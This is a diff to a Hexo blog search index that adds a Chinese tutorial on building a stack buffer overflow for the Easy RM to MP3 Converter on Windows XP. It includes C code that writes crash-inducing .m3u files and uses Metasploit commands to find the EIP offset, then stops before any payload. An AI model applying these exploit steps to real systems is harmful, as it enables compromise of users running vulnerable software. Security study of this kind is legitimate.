@@ -5,4 +5,13 @@
     <url>%2F2017%2F05%2F16%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
   </entry>
+  <entry>
+    <title><![CDATA[ExploitTutorial]]></title>
+    <url>%2F2016%2F04%2F13%2FExploitTutorial%2F</url>
+    <content type="text"><![CDATA[声明：本博客是根据Exploit该链接所写 准备工作 实验环境：windows xp windows xp sp3 下载easyRmtomp3.exe,下载地址：https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe 使程序crash 编写一个程序生成10000个字符，可以使程序crash，程序如图所示 crash的程序如下图所示： 但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示： 会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。 栈信息介绍栈的信息如下图所示： 确定return的地址偏移 构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值12345678910111213141516171819202122#include&lt;stdio.h&gt; int main() &#123; FILE* fp = NULL; fp = fopen(&quot;crash2.m3u&quot;,&quot;w+&quot;); int i = 0; if(fp == NULL) return; for(i;i &lt; 25000; i++) &#123; fprintf(fp,&quot;\x41&quot;); &#125; for(i = 0; i &lt; 5000; i++) &#123; fprintf(fp, &quot;\x42&quot;); &#125;&#125; 调试结果如图所示： 可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间 测试eip的offset具体在什么位置 利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools ./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件 构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示： 得到的eip结果如下图所示： 可知eip的值为0x42316A42 然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053 测试一下1053是否正确，编写如下程序： 运行测试一下，结果如下图： 可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的 该教程先写到这，有空再继续(＾－＾)V]]></content>
+      <tags>
+        <tag>Exploit</tag>
+        <tag>反汇编</tag>
+      </tags>
+  </entry>
 </search>
